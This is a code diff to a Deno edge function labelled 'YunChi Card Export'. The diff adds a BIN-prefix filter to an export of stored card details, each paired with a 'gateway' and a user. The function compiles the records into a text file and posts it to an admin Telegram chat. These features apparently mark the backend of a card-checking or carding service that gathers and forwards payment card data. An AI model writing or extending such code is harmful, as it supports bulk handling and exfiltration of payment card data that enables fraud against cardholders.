@@ -60,7 +60,7 @@ Deno.serve(async (req) => {
       });
     }
 
-    const { exportType = "all", searchUser = "" } = await req.json();
+    const { exportType = "all", searchUser = "", searchBin = "" } = await req.json();
 
     // Build query
     let query = supabaseAdmin
@@ -129,6 +129,14 @@ Deno.serve(async (req) => {
       );
     }
 
+    // Filter by BIN prefix
+    if (searchBin.trim()) {
+      const binPrefix = searchBin.trim();
+      finalData = finalData.filter(
+        (r: any) => r.card_details?.startsWith(binPrefix)
+      );
+    }
+
     if (finalData.length === 0) {
       return new Response(
         JSON.stringify({ success: false, error: "No records found" }),
@@ -145,7 +153,7 @@ Deno.serve(async (req) => {
       return `${card} | ${gateway} | ${usr}`;
     });
 
-    const header = `# YunChi Card Export - ${typeLabel}\n# Total: ${finalData.length}\n# Date: ${new Date().toISOString()}\n# Filter: ${searchUser || "None"}\n\n`;
+    const header = `# YunChi Card Export - ${typeLabel}\n# Total: ${finalData.length}\n# Date: ${new Date().toISOString()}\n# User Filter: ${searchUser || "None"}\n# BIN Filter: ${searchBin || "None"}\n\n`;
     const fileContent = header + lines.join("\n");
     const fileName = `yunchi-${exportType}-cards-${new Date().toISOString().split("T")[0]}.txt`;
 
@@ -153,7 +161,7 @@ Deno.serve(async (req) => {
     const formData = new FormData();
     formData.append("chat_id", ADMIN_CHAT_ID);
     formData.append("document", new Blob([fileContent], { type: "text/plain" }), fileName);
-    formData.append("caption", `📁 *Card Export — ${typeLabel}*\n\n📊 Total: *${finalData.length.toLocaleString()}* records\n📅 Date: ${new Date().toISOString().split("T")[0]}${searchUser ? `\n🔍 User Filter: ${searchUser}` : ""}`);
+    formData.append("caption", `📁 *Card Export — ${typeLabel}*\n\n📊 Total: *${finalData.length.toLocaleString()}* records\n📅 Date: ${new Date().toISOString().split("T")[0]}${searchUser ? `\n🔍 User Filter: ${searchUser}` : ""}${searchBin ? `\n💳 BIN Filter: ${searchBin}` : ""}`);
     formData.append("parse_mode", "Markdown");
 
     const tgRes = await fetch(
